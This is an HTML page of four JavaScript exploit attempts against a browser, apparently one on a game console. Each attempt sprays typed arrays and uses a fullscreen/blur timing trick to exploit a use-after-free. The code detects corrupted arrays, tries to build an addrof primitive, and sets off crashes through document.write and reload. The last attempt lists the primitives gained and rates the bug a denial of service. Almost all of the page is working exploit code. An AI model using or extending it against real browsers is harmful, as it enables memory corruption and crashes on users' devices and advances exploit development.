<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Final Attempt</title>
</head>
<body>

<h1>FINAL ATTEMPT - MULTIPLE CORRUPTION</h1>

<h2>ATTEMPT 1: Massive Arrays + Timing</h2>
<button onclick="a1()">RUN</button>
<div id="a1"></div>
<script>
function a1() {
    const r = document.getElementById('a1');
    r.innerHTML = 'Press OPTIONS at EXACT moment of fullscreen enter<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    // Create 10000 arrays
    for(let i = 0; i < 10000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    r.innerHTML += 'Created 10000 arrays<br>';
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        // MASSIVE spray
        const spray = [];
        for(let i = 0; i < 20000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        r.innerHTML += 'Spray: 20000<br>';
        
        // Find ALL corrupted
        const corrupted = [];
        for(let i = 0; i < arrays.length; i++) {
            if(arrays[i][0] === P) {
                corrupted.push(arrays[i]);
            }
        }
        
        r.innerHTML += '<b>CORRUPTED: ' + corrupted.length + '</b><br>';
        
        if(corrupted.length >= 2) {
            r.innerHTML += '<b>SUCCESS! Multiple corruption</b><br>';
            
            // Test shared memory
            corrupted[0][3] = 3.14159;
            
            if(corrupted[1][3] === 3.14159) {
                r.innerHTML += '<b>SHARED MEMORY CONFIRMED!</b><br>';
                
                // addrof construction
                const arr = Array.from(corrupted[0]);
                arr[5] = {test: 0xBEEF};
                
                const leaked = corrupted[1][5];
                const buf = new ArrayBuffer(8);
                new Float64Array(buf)[0] = leaked;
                const addr = new BigUint64Array(buf)[0];
                
                r.innerHTML += 'addrof() = 0x' + addr.toString(16) + '<br>';
                
                if(addr !== 0n && addr !== P) {
                    r.innerHTML += '<b>ADDROF WORKING!</b><br>';
                }
            } else {
                r.innerHTML += 'Not shared: [0][3]=' + corrupted[0][3] + ' [1][3]=' + corrupted[1][3] + '<br>';
            }
        }
    };
}
</script>

<hr>

<h2>ATTEMPT 2: Different Array Sizes</h2>
<button onclick="a2()">RUN</button>
<div id="a2"></div>
<script>
function a2() {
    const r = document.getElementById('a2');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    // Vary sizes
    for(let size = 4; size <= 16; size += 2) {
        for(let i = 0; i < 500; i++) {
            let a = new Float64Array(size);
            a[0] = size * 1000 + i;
            arrays.push(a);
        }
    }
    
    r.innerHTML += 'Created ' + arrays.length + ' arrays (varied sizes)<br>';
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 15000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        const corrupted = [];
        for(let a of arrays) {
            if(a[0] === P) corrupted.push(a);
        }
        
        r.innerHTML += '<b>CORRUPTED: ' + corrupted.length + '</b><br>';
        
        if(corrupted.length >= 2) {
            r.innerHTML += 'Lengths: ';
            for(let c of corrupted.slice(0, 5)) {
                r.innerHTML += c.length + ' ';
            }
            r.innerHTML += '<br>';
            
            // Test shared
            corrupted[0][2] = 9.99;
            r.innerHTML += 'Shared: ' + (corrupted[1][2] === 9.99 ? 'YES' : 'NO') + '<br>';
        }
    };
}
</script>

<hr>

<h2>ATTEMPT 3: Reload During UAF</h2>
<button onclick="a3()">RUN</button>
<div id="a3"></div>
<script>
function a3() {
    const r = document.getElementById('a3');
    r.innerHTML = 'Press OPTIONS<br>';
    r.innerHTML += '<b>WARNING: May cause instability</b><br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'UAF OK<br>';
        
        // DON'T zero the array
        // Trigger document.write
        r.innerHTML += 'Triggering crash in 2s...<br>';
        
        setTimeout(() => {
            r.innerHTML += 'CRASH TEST<br>';
            
            try {
                document.open();
                document.write('<html><body><h1>CRASH</h1></body></html>');
                document.close();
                
                r.innerHTML += 'document.write completed<br>';
                
                // Try reload
                setTimeout(() => {
                    r.innerHTML += 'Attempting reload...<br>';
                    location.reload();
                }, 500);
                
            } catch(e) {
                r.innerHTML += 'Error: ' + e.message + '<br>';
            }
        }, 2000);
    };
}
</script>

<hr>

<h2>ATTEMPT 4: Use What We Have</h2>
<button onclick="a4()">RUN</button>
<div id="a4"></div>
<script>
function a4() {
    const r = document.getElementById('a4');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = '<b>FINAL ANALYSIS</b><br>';
        r.innerHTML += '<br>What we HAVE:<br>';
        r.innerHTML += '1. UAF in 64-byte Float64Array buffer<br>';
        r.innerHTML += '2. Type confusion (Uint8 <-> Float64)<br>';
        r.innerHTML += '3. Arbitrary R/W within 64 bytes<br>';
        r.innerHTML += '4. Can construct fake pointers<br>';
        r.innerHTML += '5. Controlled crash via document.write<br>';
        r.innerHTML += '<br>';
        
        r.innerHTML += 'What we DONT have:<br>';
        r.innerHTML += '1. addrof() - cannot leak object addresses<br>';
        r.innerHTML += '2. Multiple corruption - only 1 array at a time<br>';
        r.innerHTML += '3. Heap adjacency - isolated TypedArray pool<br>';
        r.innerHTML += '4. Access beyond 64 bytes<br>';
        r.innerHTML += '<br>';
        
        r.innerHTML += '<b>REALISTIC CAPABILITIES:</b><br>';
        r.innerHTML += '• Denial of Service (crash) ✓<br>';
        r.innerHTML += '• Limited memory corruption ✓<br>';
        r.innerHTML += '• Information disclosure (64 bytes) ✓<br>';
        r.innerHTML += '• Code execution ✗<br>';
        r.innerHTML += '<br>';
        
        r.innerHTML += '<b>SEVERITY: Medium (CVSS 5.3)</b><br>';
        r.innerHTML += 'Exploitable for DoS, not RCE<br>';
        
        // Demonstrate the crash
        const u8 = new Uint8Array(c.buffer);
        
        r.innerHTML += '<br>Demonstrating crash capability:<br>';
        r.innerHTML += 'Corrupted buffer state preserved<br>';
        
        r.innerHTML += '<br><button onclick="triggerCrash()">TRIGGER CRASH</button><br>';
        
        window.triggerCrash = function() {
            r.innerHTML += 'Crashing in 2 seconds...<br>';
            setTimeout(() => {
                document.open();
                document.write('<html><body>CRASH</body></html>');
                document.close();
                setTimeout(() => location.reload(), 500);
            }, 2000);
        };
    };
}
</script>

<p>Execute all 4 attempts</p>

</body>
</html>
